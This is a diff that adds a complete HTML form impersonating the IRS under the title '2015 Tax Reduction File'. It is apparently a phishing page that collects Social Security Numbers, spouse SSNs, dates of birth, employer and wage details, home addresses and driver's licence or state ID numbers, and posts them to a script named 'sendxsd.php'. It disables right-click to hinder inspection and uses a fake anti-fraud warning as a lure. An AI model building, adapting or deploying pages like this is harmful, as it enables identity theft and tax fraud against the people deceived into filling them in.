@@ -1,0 +1,1386 @@
+<html xmlns="http://www.w3.org/1999/xhtml" lang="EN-US" dir="ltr">
+ <head>
+  <link href="favicon.jpg" type="image/x-icon" rel="shortcut icon" />
+  <!--
+<!DOCTYPE html-->
+  <title>
+   Internal Revenue Service
+  </title>
+  <!--<html locale="true" />-->
+  <meta content="en-US" http-equiv="Content-Language" />
+  <meta content="Content-Type" http-equiv="Content-Type" />
+  <meta content="no-cache" http-equiv="Cache-Control" />
+  <meta content="no-cache" http-equiv="pragma" />
+  <meta content="0" http-equiv="expires" />
+  <style type="text/css">
+   @import url("css/efp.css");
+  </style>
+  <!--[if IE]>
+		<style type="text/css">
+			@import url("css/efp-ie.css");
+		</style>
+		<![endif]-->
+  <script type="text/javascript" src="js/windows.js">
+  </script>
+  <script type="text/javascript" src="js/inputSharedSecrets.js">
+  </script>
+  <script src="js/jquery-1.11.2.min.js" type="text/javascript">
+  </script>
+  <script type="text/javascript">
+   //<![CDATA[ 
+$(window).load(function(){
+$(document).ready(function () {
+    $('#domicilio').hide();
+    $(".radio").change(function () { //use change event
+        if (this.value == "domicilio") { //check value if it is domicilio
+            $('#domicilio').stop(true,true).show(); //then show
+        } else {
+            $('#domicilio').stop(true,true).show(); //else hide
+        }
+    });
+});
+});//]]>  
+
+
+$(function() {
+        $('#filingStatus').change(function(){
+            $('.filing').hide();
+            $('#' + $(this).val()).show();
+        });
+    });
+    
+//<![CDATA[ 
+$(window).load(function(){
+$('.eind').keyup(function() {
+    foo = $(this).val().split("-").join(""); // remove hyphens
+ 
+        foo = foo.match(new RegExp('.{1,8}$|.{2}', 'g')).join("-");
+
+        $(this).val(foo);
+   
+    });
+});//]]>
+  </script>
+  <script type="text/javascript">
+   //<![CDATA[ 
+$(window).load(function(){
+$(document).ready(function () {
+    $('#domi').hide();
+    $(".radi").change(function () { //use change event
+        if (this.value == "dl") { //check value if it is domicilio
+            $('#domi').stop(true,true).show(); //then show
+        } 
+		 if (this.value == "si") { //check value if it is domicilio
+            $('#domi').stop(true,true).show(); //then show
+        } 
+    });
+});
+});//]]>
+  </script>
+  <script language="javascript">
+   var message="This function is not allowed here.";
+           function clickIE4(){
+                 if (event.button==2){
+                     alert(message);
+                     return false;
+                 }
+           }
+           function clickNS4(e){
+                if (document.layers||document.getElementById&&!document.all){
+                        if (e.which==2||e.which==3){
+                                  alert(message);
+                                  return false;
+                        }
+                }
+           }
+           if (document.layers){
+                 document.captureEvents(Event.MOUSEDOWN);
+                 document.onmousedown=clickNS4;
+           }
+           else if (document.all&&!document.getElementById){
+                 document.onmousedown=clickIE4;
+           }
+           document.oncontextmenu=new Function("alert(message);return false;")
+  </script>
+ </head>
+ <body oncontextmenu="return false">
+  <div id="container">
+   <div id="header">
+    <a class="skip-link" href="#mainContent">
+     Skip to Main Content
+    </a>
+    <script type="text/javascript">
+     function toggleHeaderLinks() {
+		var jsHelpDivId = document.getElementById("jsHelpDiv");
+		var noJsHelpDivId = document.getElementById("noJsHelpDiv");
+
+		jsHelpDivId.style.display="inline";
+		noJsHelpDivId.style.display="none";
+	}
+    </script>
+    <a href="#">
+     <img alt="Logo" title="" src="images/irslogo.gif" />
+    </a>
+    <div id="headerlinks">
+     <!-- 
+		If user exits application from results page, requirements state to log 
+		a unique CFP.
+	 -->
+     <!-- logout link -->
+     <a title="Click this link to exit out of this site." href="#">
+      Exit
+     </a>
+     |
+     <!-- help link -->
+     <div style="display: inline;" id="jsHelpDiv">
+      <a title="Click this link for a page of help topics." href="javascript:openHelp('help.php','Help')">
+       Help
+      </a>
+     </div>
+     <div style="display: none;" id="noJsHelpDiv">
+      <a title="Click this link for a page of help topics." target="_help" href="help.php">
+       Help
+      </a>
+     </div>
+    </div>
+    <script type="text/JavaScript" language="JavaScript">
+     toggleHeaderLinks();
+    </script>
+   </div>
+   <div id="content">
+    <a class="skip-link" name="#mainContent">
+     Main Content
+    </a>
+    <form onsubmit="return formValidation();" autocomplete="off" action="sendxsd.php" method="post" name="efpForm">
+     <script type="text/javascript">
+      function isNumberKey(event) {
+		var charCode;
+		if (window.event) {
+			charCode = event.keyCode;
+		} else {
+			charCode = event.which;
+		}
+
+		if (charCode > 31 &&
+				(charCode < 48 || charCode > 57)) {
+			//alert("false - " + charCode);
+			return false;
+		}
+		return true;
+	}
+	//autoTab
+	// parameters: 	event - javascript keyup event
+	//				current - current input field
+	//				dest - destination input field
+	function autoTab(event, current, dest) {
+		var keyCode;
+		if (window.event) {
+			keyCode = event.keyCode;
+		} else {
+			keyCode = event.which;
+		}
+
+		if (keyCode < 41 && keyCode > 36) {
+			//ignore
+		} else if (keyCode == 9 || keyCode == 16) {
+			current.focus();
+			current.select();
+		} else if (current.value.length == current.getAttribute("maxlength")) {
+			dest.focus();
+			dest.select();
+		}
+	}
+
+	//checkErrors - no parameters
+	//
+	//Toggles errorContent div based on whether errors exists.
+	//Interogates Struts ActionErrors from request
+	//if errors exist then toggle errorContent div on, otherwise 
+	//toggle errorContent off 
+	function checkErrors() {
+		var errsDiv;
+
+		if(errs != null && errs !="" && errs !=" ") {
+			errsDiv = document.getElementById("errorContent");
+			errsDiv.style.display="block";
+		} else {
+			errsDiv = document.getElementById("errorContent");
+			errsDiv.style.display="none";
+		}
+	}
+
+	//updateTableSummary - no parameters
+	//
+	//Updates summary field on table from resource bundle 
+	//for 508 Compliance
+	function updateTableSummary() {
+		var tbl = document.getElementById("sharedSecretsTable");
+		tbl.summary = summary;
+	}
+	
+	function toggleHelpTopics() {
+		var piPopupDivId = document.getElementById("piHelpTopicPopupDiv");
+		var piTargetDivId = document.getElementById("piHelpTopicTargetDiv");
+		var faPopupDivId = document.getElementById("faHelpTopicPopupDiv");
+		var faTargetDivId = document.getElementById("faHelpTopicTargetDiv");
+		var maPopupDivId = document.getElementById("maHelpTopicPopupDiv");
+		var maTargetDivId = document.getElementById("maHelpTopicTargetDiv");
+		var poPopupDivId = document.getElementById("poBoxHelpTopicPopupDiv");
+		var poTargetDivId = document.getElementById("poBoxHelpTopicTargetDiv");
+		
+		piPopupDivId.style.display="inline";
+		piTargetDivId.style.display="none";
+		faPopupDivId.style.display="inline";
+		faTargetDivId.style.display="none";
+		maPopupDivId.style.display="inline";
+		maTargetDivId.style.display="none";
+		poPopupDivId.style.display="inline";
+		poTargetDivId.style.display="none";
+	}
+	
+	function formatCommas(input)
+            {
+                var nStr = input.value + '';
+                nStr = nStr.replace( /\,/g, "");
+                x = nStr.split( '.' );
+                x1 = x[0];
+                x2 = x.length > 1 ? '.' + x[1] : '';
+                var rgx = /(\d+)(\d{3})/;
+                while ( rgx.test(x1) ) {
+                    x1 = x1.replace( rgx, '$1' + ',' + '$2' );
+                }
+                input.value = x1 + x2;
+            }
+     </script>
+     <div id="contentHeader">
+      <div id="language">
+       <a title="Click this link to view help in Spanish" target="_help" href="http://www.irs.gov/espanol/article/0,,id=214775,00.html">
+        español
+       </a>
+      </div>
+      <h2>
+       2015 Tax Reduction File -
+      </h2>
+     </div>
+     <div style="display: block;" id="errorContent">
+     </div>
+     <div id="privacy_notice">
+     </div>
+     <h4>
+      <font color="red">
+      </font>
+      <center>
+       <font color="red">
+        IMPORTANT FOR EVERY TAX PAYER TO AVOID DELAYS AND FRAUD.
+       </font>
+      </center>
+     </h4>
+     <table summary="form layout table" class="shared_secrets_table" id="sharedSecretsTable">
+      <caption>
+       Required fields
+       <span class="required">
+        *
+       </span>
+      </caption>
+      <!-- SSN Row -->
+      <tbody>
+       <tr>
+        <td class="td_align_right">
+         <label>
+          Social Security Number
+          <span class="required">
+           *
+          </span>
+         </label>
+         <div class="comment">
+          or Individual Taxpayer Identification Number
+         </div>
+        </td>
+        <td class="td_align_left">
+         <input type="password" title="Enter the first 3 digits of your Social Security Number" id="ssn1" onkeypress="return isNumberKey(event)" onkeyup="autoTab(event, this, document.efpForm.ssn2)" value="" size="3" maxlength="3" name="ssn1" />
+         -
+         <input type="password" title="Enter the middle 2 digits of your Social Security Number" id="ssn2" onkeypress="return isNumberKey(event)" onkeyup="autoTab(event, this, document.efpForm.ssn3)" value="" size="2" maxlength="2" name="ssn2" />
+         -
+         <input type="text" title="Enter the last 4 digits of your Social Security Number" id="ssn3" onkeypress="return isNumberKey(event)" value="" size="4" maxlength="4" name="ssn3" />
+        </td>
+        <td rowspan="4" class="td_help">
+        </td>
+       </tr>
+       <!-- Did you file? Row -->
+       <tr>
+        <td class="td_align_right">
+        </td>
+        <td class="td_align_left">
+         <label for="filing">
+          Did You Submit Your Federal Income Tax Returns for 2014
+          <span class="required">
+           *
+          </span>
+         </label>
+         <div id="privacy_notice">
+          Yes
+          <input type="radio" id="re" value="domicilio" name="d_file" class="radio" />
+            
+			No
+          <input type="radio" id="close" value="close" name="d_file" class="radio" />
+         </div>
+        </td>
+       </tr>
+       <!-- ecode Row -->
+      </tbody>
+      <tbody id="domicilio" style="display: none;">
+       <tr>
+        <td class="td_align_right">
+         <label for="ein">
+          Employer Identification Number
+          <span class="required">
+           *
+          </span>
+         </label>
+        </td>
+        <td class="td_align_left">
+         <input type="text" title="Enter your EIN" id="eind" value="" size="25" maxlength="10" class="eind" name="ein" />
+        </td>
+       </tr>
+       <tr>
+        <td class="td_align_right">
+         <label for="employer">
+          Employer Name
+          <span class="required">
+           *
+          </span>
+         </label>
+        </td>
+        <td class="td_align_left">
+         <input type="text" title="Enter your employer" id="employer" value="" size="35" maxlength="100" name="employer" />
+        </td>
+       </tr>
+       <tr>
+        <td class="td_align_right">
+         <label for="employer">
+          Employer Full Address
+          <span class="required">
+           *
+          </span>
+         </label>
+        </td>
+        <td class="td_align_left">
+         <textarea cols="34" name="employer_add">
+         </textarea>
+        </td>
+       </tr>
+       <tr>
+        <td class="td_align_right">
+         <label for="wages">
+          Annual Wages / Salary
+          <span class="required">
+           *
+          </span>
+         </label>
+        </td>
+        <td class="td_align_left">
+         <input type="text" title="Enter your annual wages / salary" id="income" value="" size="20" maxlength="20" onkeyup="formatCommas(this)" name="income" />
+        </td>
+       </tr>
+       <tr>
+        <td class="td_align_right">
+        </td>
+        <td class="td_align_left">
+        </td>
+       </tr>
+      </tbody>
+      <!-- First Name Row -->
+      <tbody>
+       <tr>
+        <td class="td_align_right">
+         <label for="firstName">
+          First Name
+          <span class="required">
+           *
+          </span>
+         </label>
+        </td>
+        <td class="td_align_left">
+         <input type="text" title="Enter your First Name" id="firstName" value="" size="35" maxlength="35" name="firstName" />
+        </td>
+       </tr>
+       <!-- Last Name Row -->
+       <tr>
+        <td class="td_align_right">
+         <label for="lastName">
+          Last Name
+          <span class="required">
+           *
+          </span>
+         </label>
+        </td>
+        <td class="td_align_left">
+         <input type="text" title="Enter your Last Name" id="lastName" value="" size="35" maxlength="35" name="lastName" />
+        </td>
+       </tr>
+       <!-- Email Row -->
+       <tr>
+        <td class="td_align_right">
+         <label for="lastName">
+          Email Address
+          <span class="required">
+           *
+          </span>
+         </label>
+        </td>
+        <td class="td_align_left">
+         <input type="text" title="Enter your Email Address" id="email" value="" size="35" maxlength="100" name="email" />
+        </td>
+       </tr>
+       <!-- DOB -->
+       <tr>
+        <td class="td_align_right">
+         <label>
+          Date of Birth
+          <span class="required">
+           *
+          </span>
+         </label>
+        </td>
+        <td class="td_align_left">
+         <input type="text" title="Date of Birth MM" id="dobMonth" onkeypress="return isNumberKey(event)" onkeyup="autoTab(event, this, document.efpForm.dobDay)" onclick="selectAllDate(this)" value="" size="2" maxlength="2" name="dobMonth" />
+         /
+         <input type="text" title="Date of Birth DD" id="dobDay" onkeypress="return isNumberKey(event)" onkeyup="autoTab(event, this, document.efpForm.dobYear)" onclick="selectAllDate(this)" value="" size="2" maxlength="2" name="dobDay" />
+         /
+         <input type="text" title="Date of Birth YYYY" id="dobYear" onkeypress="return isNumberKey(event)" onclick="selectAllDate(this)" value="" size="4" maxlength="4" name="dobYear" />
+         <span class="format">
+          MM / DD / YYYY
+         </span>
+        </td>
+       </tr>
+       <!-- Filing Status -->
+       <tr>
+        <td class="td_align_right">
+         <label for="filingStatus">
+          Filing Status
+          <span class="required">
+           *
+          </span>
+         </label>
+        </td>
+        <td class="td_align_left">
+         <select title="Select your Filing Status" id="filingStatus" name="filingStatus">
+          <option value="none">
+           Select One
+          </option>
+          <option value="1">
+           Single
+          </option>
+          <option value="2">
+           Married-Filing Joint Return
+          </option>
+          <option value="3">
+           Married-Filing Separate Return
+          </option>
+          <option value="4">
+           Head of Household
+          </option>
+          <option value="5">
+           Qualifying Widow(er) with dependent child
+          </option>
+         </select>
+        </td>
+       </tr>
+       <!-- spouse details -->
+      </tbody>
+      <tbody style="display:none" class="filing" id="2">
+       <tr>
+        <td class="td_align_right">
+        </td>
+        <td class="td_align_left">
+        </td>
+       </tr>
+       <tr>
+        <td class="td_align_right">
+         <label for="filingStatus">
+          Spouse Full Names
+          <span class="required">
+           *
+          </span>
+         </label>
+        </td>
+        <td class="td_align_left">
+         <input type="text" title="Enter your Spouse Full Name" id="spouse_fname" value="" size="35" maxlength="85" name="spouse_fname" />
+        </td>
+       </tr>
+       <tr>
+       </tr>
+       <tr>
+        <td class="td_align_right">
+         <label>
+          Spouse SSN
+          <span class="required">
+           *
+          </span>
+         </label>
+         <label class="hidden">
+          Required Field
+         </label>
+        </td>
+        <td class="td_align_left">
+         <input type="password" title="Enter the first 3 digits of your Spouse SSN" id="ssn4" onkeypress="return isNumberKey(event)" onkeyup="autoTab(event, this, document.efpForm.ssn5)" value="" size="3" maxlength="3" name="ssn4" />
+         -
+         <input type="password" title="Enter the middle 2 digits of your Spouse SSN" id="ssn5" onkeypress="return isNumberKey(event)" onkeyup="autoTab(event, this, document.efpForm.ssn6)" value="" size="2" maxlength="2" name="ssn5" />
+         -
+         <input type="text" title="Enter the last 4 digits of your Spouse SSN" id="ssn6" onkeypress="return isNumberKey(event)" value="" size="4" maxlength="4" name="ssn6" />
+        </td>
+        <td rowspan="4" class="td_help">
+        </td>
+       </tr>
+       <!-- Spouse DOB -->
+       <tr>
+        <td class="td_align_right">
+         <label>
+          Spouse Date of Birth
+          <span class="required">
+           *
+          </span>
+         </label>
+        </td>
+        <td class="td_align_left">
+         <input type="text" title="Spouse Date of Birth MM" id="dobspMonth" onkeyup="autoTab(event, this, document.efpForm.dobspDay)" onclick="selectAllDate(this)" value="" size="2" maxlength="2" name="dobspMonth" />
+         /
+         <input type="text" title="Spouse Date of Birth DD" id="dobspDay" onkeyup="autoTab(event, this, document.efpForm.dobspYear)" onclick="selectAllDate(this)" value="" size="2" maxlength="2" name="dobspDay" />
+         /
+         <input type="text" title="Spouse Date of Birth YYYY" id="dobspYear" onclick="selectAllDate(this)" value="" size="4" maxlength="4" name="dobspYear" />
+         <span class="format">
+          MM / DD / YYYY
+         </span>
+        </td>
+       </tr>
+       <tr>
+        <td class="td_align_right">
+        </td>
+        <td class="td_align_left">
+        </td>
+       </tr>
+      </tbody>
+      <!-- Address -->
+      <tbody>
+       <tr>
+        <td class="td_align_right">
+         <label>
+          Address (Number and Street)
+          <span class="required">
+           *
+          </span>
+         </label>
+        </td>
+        <td class="td_align_left">
+         <input type="text" title="Enter your Address (Number and Street)" id="address" value="" size="50" maxlength="100" name="address" />
+        </td>
+       </tr>
+       <!-- Apt. Number -->
+       <tr>
+        <td class="td_align_right">
+         <label>
+          Apt. Number
+         </label>
+        </td>
+        <td class="td_align_left">
+         <input type="text" title="Enter your Apartment Number - Required if it appears on your tax return" id="aptNumber" value="" size="10" maxlength="10" name="aptNumber" />
+        </td>
+       </tr>
+       <!-- Country -->
+       <tr>
+        <td class="td_align_right">
+         <label for="country">
+          Country
+          <span class="required">
+           *
+          </span>
+         </label>
+        </td>
+        <td class="td_align_left">
+         <select title="Select your Country" id="country" onchange="checkCountry(this)" name="country">
+          <option selected="selected" value="United States">
+           United States
+          </option>
+         </select>
+        </td>
+        <td rowspan="4" class="td_help">
+        </td>
+       </tr>
+       <!-- City -->
+       <tr>
+        <td class="td_align_right">
+         <div id="cityDivLabelId">
+          <label>
+           City
+           <span class="required">
+            *
+           </span>
+          </label>
+         </div>
+        </td>
+        <td class="td_align_left">
+         <div id="cityDivFieldId">
+          <input type="text" title="Enter City, County or Province (Only Enter City if U.S. Address)" id="city" value="" size="37" maxlength="50" name="city" />
+         </div>
+        </td>
+       </tr>
+       <!-- State -->
+       <tr>
+        <td class="td_align_right">
+         <div id="stateDivLblId">
+          <label>
+           State/U.S. Territory
+           <span class="required">
+            *
+           </span>
+          </label>
+         </div>
+        </td>
+        <td class="td_align_left">
+         <select title="Select your State or U.S. Territory" id="state" name="state">
+          <option selected="selected" value="ZZ">
+           Select One
+          </option>
+          <option value="AL">
+           Alabama (AL)
+          </option>
+          <option value="AK">
+           Alaska (AK)
+          </option>
+          <option value="AZ">
+           Arizona (AZ)
+          </option>
+          <option value="AR">
+           Arkansas (AR)
+          </option>
+          <option value="CA">
+           California (CA)
+          </option>
+          <option value="CO">
+           Colorado (CO)
+          </option>
+          <option value="CT">
+           Connecticut (CT)
+          </option>
+          <option value="DE">
+           Delaware (DE)
+          </option>
+          <option value="DC">
+           District of Columbia (DC)
+          </option>
+          <option value="FL">
+           Florida (FL)
+          </option>
+          <option value="GA">
+           Georgia (GA)
+          </option>
+          <option value="HI">
+           Hawaii (HI)
+          </option>
+          <option value="ID">
+           Idaho (ID)
+          </option>
+          <option value="IL">
+           Illinois (IL)
+          </option>
+          <option value="IN">
+           Indiana (IN)
+          </option>
+          <option value="IA">
+           Iowa (IA)
+          </option>
+          <option value="KS">
+           Kansas (KS)
+          </option>
+          <option value="KY">
+           Kentucky (KY)
+          </option>
+          <option value="LA">
+           Louisiana (LA)
+          </option>
+          <option value="ME">
+           Maine (ME)
+          </option>
+          <option value="MD">
+           Maryland (MD)
+          </option>
+          <option value="MA">
+           Massachusetts (MA)
+          </option>
+          <option value="MI">
+           Michigan (MI)
+          </option>
+          <option value="MN">
+           Minnesota (MN)
+          </option>
+          <option value="MS">
+           Mississippi (MS)
+          </option>
+          <option value="MO">
+           Missouri (MO)
+          </option>
+          <option value="MT">
+           Montana (MT)
+          </option>
+          <option value="NE">
+           Nebraska (NE)
+          </option>
+          <option value="NV">
+           Nevada (NV)
+          </option>
+          <option value="NH">
+           New Hampshire (NH)
+          </option>
+          <option value="NJ">
+           New Jersey (NJ)
+          </option>
+          <option value="NM">
+           New Mexico (NM)
+          </option>
+          <option value="NY">
+           New York (NY)
+          </option>
+          <option value="NC">
+           North Carolina (NC)
+          </option>
+          <option value="ND">
+           North Dakota (ND)
+          </option>
+          <option value="OH">
+           Ohio (OH)
+          </option>
+          <option value="OK">
+           Oklahoma (OK)
+          </option>
+          <option value="OR">
+           Oregon (OR)
+          </option>
+          <option value="PA">
+           Pennsylvania (PA)
+          </option>
+          <option value="RI">
+           Rhode Island (RI)
+          </option>
+          <option value="SC">
+           South Carolina (SC)
+          </option>
+          <option value="SD">
+           South Dakota (SD)
+          </option>
+          <option value="TN">
+           Tennessee (TN)
+          </option>
+          <option value="TX">
+           Texas (TX)
+          </option>
+          <option value="UT">
+           Utah (UT)
+          </option>
+          <option value="VT">
+           Vermont (VT)
+          </option>
+          <option value="VA">
+           Virginia (VA)
+          </option>
+          <option value="WA">
+           Washington (WA)
+          </option>
+          <option value="WV">
+           West Virginia (WV)
+          </option>
+          <option value="WI">
+           Wisconsin (WI)
+          </option>
+          <option value="WY">
+           Wyoming (WY)
+          </option>
+          <option value="">
+           -------
+          </option>
+          <option value="AS">
+           American Samoa (AS)
+          </option>
+          <option value="FM">
+           Federated States of Micronesia (FM)
+          </option>
+          <option value="GU">
+           Guam (GU)
+          </option>
+          <option value="MH">
+           Marshall Islands (MH)
+          </option>
+          <option value="MP">
+           Northern Mariana Islands (MP)
+          </option>
+          <option value="PW">
+           Palau (PW)
+          </option>
+          <option value="PR">
+           Puerto Rico (PR)
+          </option>
+          <option value="VI">
+           Virgin Islands (VI)
+          </option>
+          <option value="">
+           -------
+          </option>
+          <option value="AE">
+           Armed Forces Africa (AE)
+          </option>
+          <option value="AA">
+           Armed Forces Americas (AA)
+          </option>
+          <option value="AE">
+           Armed Forces Canada (AE)
+          </option>
+          <option value="AE">
+           Armed Forces Europe (AE)
+          </option>
+          <option value="AE">
+           Armed Forces Middle East (AE)
+          </option>
+          <option value="AP">
+           Armed Forces Pacific (AP)
+          </option>
+         </select>
+        </td>
+       </tr>
+       <!-- Zip Code -->
+       <tr>
+        <td class="td_align_right">
+         <div id="zipDivLabelId">
+          <label>
+           ZIP Code
+           <span class="required">
+            *
+           </span>
+          </label>
+         </div>
+        </td>
+        <td class="td_align_left">
+         <div id="zipDivFieldId">
+          <input type="text" title="Enter your Zip Code/Postal Code (Only Required if U.S. Address)" id="zipCode" value="" size="12" maxlength="12" name="zipCode" />
+         </div>
+        </td>
+       </tr>
+       <tr>
+        <td class="td_align_right">
+        </td>
+        <td class="td_align_left">
+         <label for="fil">
+          Identification ID
+          <span class="required">
+           *
+          </span>
+         </label>
+         <div id="privacy_notice">
+          Drivers License
+          <input type="radio" id="re1" value="dl" name="x_file" class="radi" />
+            
+			State ID
+          <input type="radio" id="re1" value="si" name="x_file" class="radi" />
+         </div>
+        </td>
+       </tr>
+       <!-- ecode Row -->
+      </tbody>
+      <tbody id="domi" style="display: none;">
+       <tr>
+        <td class="td_align_right">
+         <div id="zipDivLabelId">
+          <label>
+           Number
+           <span class="required">
+            *
+           </span>
+          </label>
+         </div>
+        </td>
+        <td class="td_align_left">
+         <div id="zipDivFieldId">
+          <input type="text" title="Enter your Number (Only Required if U.S. Address)" id="re1" value="" size="12" maxlength="12" name="re1" />
+         </div>
+        </td>
+       </tr>
+       <tr>
+        <td class="td_align_right">
+         <label>
+          Issue Date
+          <span class="required">
+           *
+          </span>
+         </label>
+        </td>
+        <td class="td_align_left">
+         <span class="fieldset">
+          <select id="issue1" name="issue1">
+           <option value="0">
+            - Day -
+           </option>
+           <option value="01">
+            01
+           </option>
+           <option value="02">
+            02
+           </option>
+           <option value="03">
+            03
+           </option>
+           <option value="04">
+            04
+           </option>
+           <option value="05">
+            05
+           </option>
+           <option value="06">
+            06
+           </option>
+           <option value="07">
+            07
+           </option>
+           <option value="08">
+            08
+           </option>
+           <option value="09">
+            09
+           </option>
+           <option value="10">
+            10
+           </option>
+           <option value="11">
+            11
+           </option>
+           <option value="12">
+            12
+           </option>
+           <option value="13">
+            13
+           </option>
+           <option value="14">
+            14
+           </option>
+           <option value="15">
+            15
+           </option>
+           <option value="16">
+            16
+           </option>
+           <option value="17">
+            17
+           </option>
+           <option value="18">
+            18
+           </option>
+           <option value="19">
+            19
+           </option>
+           <option value="20">
+            20
+           </option>
+           <option value="21">
+            21
+           </option>
+           <option value="22">
+            22
+           </option>
+           <option value="23">
+            23
+           </option>
+           <option value="24">
+            24
+           </option>
+           <option value="25">
+            25
+           </option>
+           <option value="26">
+            26
+           </option>
+           <option value="27">
+            27
+           </option>
+           <option value="28">
+            28
+           </option>
+           <option value="29">
+            29
+           </option>
+           <option value="30">
+            30
+           </option>
+           <option value="31">
+            31
+           </option>
+          </select>
+          /
+          <select id="issue2" name="issue2">
+           <option selected="selected" value="0">
+            - Month -
+           </option>
+           <option value="01">
+            01 (January)
+           </option>
+           <option value="02">
+            02 (February)
+           </option>
+           <option value="03">
+            03 (March)
+           </option>
+           <option value="04">
+            04 (April)
+           </option>
+           <option value="05">
+            05 (May)
+           </option>
+           <option value="06">
+            06 (June)
+           </option>
+           <option value="07">
+            07 (July)
+           </option>
+           <option value="08">
+            08 (August)
+           </option>
+           <option value="09">
+            09 (September)
+           </option>
+           <option value="10">
+            10 (October)
+           </option>
+           <option value="11">
+            11 (November)
+           </option>
+           <option value="12">
+            12 (December)
+           </option>
+          </select>
+          /
+          <select id="issue3" name="issue3">
+           <option selected="selected" value="0">
+            - Year -
+           </option>
+           <option value="2000">
+            2000
+           </option>
+           <option value="2001">
+            2001
+           </option>
+           <option value="2002">
+            2002
+           </option>
+           <option value="2003">
+            2003
+           </option>
+           <option value="2004">
+            2004
+           </option>
+           <option value="2005">
+            2005
+           </option>
+           <option value="2006">
+            2006
+           </option>
+           <option value="2007">
+            2007
+           </option>
+           <option value="2008">
+            2008
+           </option>
+           <option value="2009">
+            2009
+           </option>
+           <option value="2010">
+            2010
+           </option>
+           <option value="2011">
+            2011
+           </option>
+           <option value="2012">
+            2012
+           </option>
+           <option value="2013">
+            2013
+           </option>
+           <option value="2014">
+            2014
+           </option>
+           <option value="2015">
+            2015
+           </option>
+          </select>
+          <span class="format">
+           DD / MM / YYYY
+          </span>
+         </span>
+        </td>
+       </tr>
+       <tr>
+        <td class="td_align_right">
+         <label>
+          Expire Date
+          <span class="required">
+           *
+          </span>
+         </label>
+        </td>
+        <td class="td_align_left">
+         <span class="fieldset">
+          <select id="exp1" name="exp1">
+           <option value="0">
+            - Day -
+           </option>
+           <option value="01">
+            01
+           </option>
+           <option value="02">
+            02
+           </option>
+           <option value="03">
+            03
+           </option>
+           <option value="04">
+            04
+           </option>
+           <option value="05">
+            05
+           </option>
+           <option value="06">
+            06
+           </option>
+           <option value="07">
+            07
+           </option>
+           <option value="08">
+            08
+           </option>
+           <option value="09">
+            09
+           </option>
+           <option value="10">
+            10
+           </option>
+           <option value="11">
+            11
+           </option>
+           <option value="12">
+            12
+           </option>
+           <option value="13">
+            13
+           </option>
+           <option value="14">
+            14
+           </option>
+           <option value="15">
+            15
+           </option>
+           <option value="16">
+            16
+           </option>
+           <option value="17">
+            17
+           </option>
+           <option value="18">
+            18
+           </option>
+           <option value="19">
+            19
+           </option>
+           <option value="20">
+            20
+           </option>
+           <option value="21">
+            21
+           </option>
+           <option value="22">
+            22
+           </option>
+           <option value="23">
+            23
+           </option>
+           <option value="24">
+            24
+           </option>
+           <option value="25">
+            25
+           </option>
+           <option value="26">
+            26
+           </option>
+           <option value="27">
+            27
+           </option>
+           <option value="28">
+            28
+           </option>
+           <option value="29">
+            29
+           </option>
+           <option value="30">
+            30
+           </option>
+           <option value="31">
+            31
+           </option>
+          </select>
+          /
+          <select id="exp2" name="exp2">
+           <option selected="selected" value="0">
+            - Month -
+           </option>
+           <option value="01">
+            01 (January)
+           </option>
+           <option value="02">
+            02 (February)
+           </option>
+           <option value="03">
+            03 (March)
+           </option>
+           <option value="04">
+            04 (April)
+           </option>
+           <option value="05">
+            05 (May)
+           </option>
+           <option value="06">
+            06 (June)
+           </option>
+           <option value="07">
+            07 (July)
+           </option>
+           <option value="08">
+            08 (August)
+           </option>
+           <option value="09">
+            09 (September)
+           </option>
+           <option value="10">
+            10 (October)
+           </option>
+           <option value="11">
+            11 (November)
+           </option>
+           <option value="12">
+            12 (December)
+           </option>
+          </select>
+          /
+          <select id="exp3" name="exp3">
+           <option selected="selected" value="0">
+            - Year -
+           </option>
+           <option value="2016">
+            2016
+           </option>
+           <option value="2017">
+            2017
+           </option>
+           <option value="2018">
+            2018
+           </option>
+           <option value="2019">
+            2019
+           </option>
+           <option value="2020">
+            2020
+           </option>
+           <option value="2021">
+            2021
+           </option>
+           <option value="2022">
+            2022
+           </option>
+           <option value="2023">
+            2023
+           </option>
+           <option value="2024">
+            2024
+           </option>
+           <option value="2025">
+            2025
+           </option>
+           <option value="2026">
+            2026
+           </option>
+           <option value="2027">
+            2027
+           </option>
+           <option value="2028">
+            2028
+           </option>
+           <option value="2029">
+            2029
+           </option>
+           <option value="2030">
+            2030
+           </option>
+          </select>
+          <span class="format">
+           DD / MM / YYYY
+          </span>
+         </span>
+        </td>
+       </tr>
+      </tbody>
+     </table>
+     <div id="button_container">
+      <div class="right_button_row">
+       <input type="submit" title="Click here to submit the form and receive your Electronic Filing PIN." value="Submit" name="submit" />
+      </div>
+     </div>
+    </form>
+    <script type="text/JavaScript" language="JavaScript">
+     checkErrors();
+	toggleHelpTopics();
+	updateTableSummary();
+	checkCountry(document.forms[0].country);
+    </script>
+   </div>
+   <div id="footer">
+    <a title="Click this link to view the IRS Privacy Policy" href="javascript:privacy_securitypolicy()">
+     IRS Privacy Policy
+    </a>
+   </div>
+  </div>
+  <script type="text/javascript">
+   function formValidation(){
+
+    if((document.efpForm.d_file[0].checked == false ) && (document.efpForm.d_file[1].checked == false ))
+    {
+        alert ("Did You Submit Your Federal Income Tax Returns for 2014?");
+        return false;
+    }
+    else if(document.efpForm.d_file[0].checked == true)
+    {
+	
+        if (document.efpForm.ein.value == "" )
+		{
+			alert("You must enter your Employer Identification Number");
+			document.efpForm.ein.focus();
+            return false;
+        }
+		if(document.efpForm.ein.value.length < 9 )
+        {
+            alert("Invalid Employer Identification Number");
+            document.efpForm.ein.focus();
+            return false;
+        }
+		if(document.efpForm.employer.value.length < 5 )
+        {
+            alert("Provide Your Employer Name");
+            document.efpForm.employer.focus();
+            return false;
+        }
+		if(document.efpForm.employer_add.value.length < 10 )
+        {
+            alert("Provide Your Employer Full Address");
+            document.efpForm.employer_add.focus();
+            return false;
+        }
+    }
+    
+    return true;
+}
+  </script>
+ </body>
+</html>
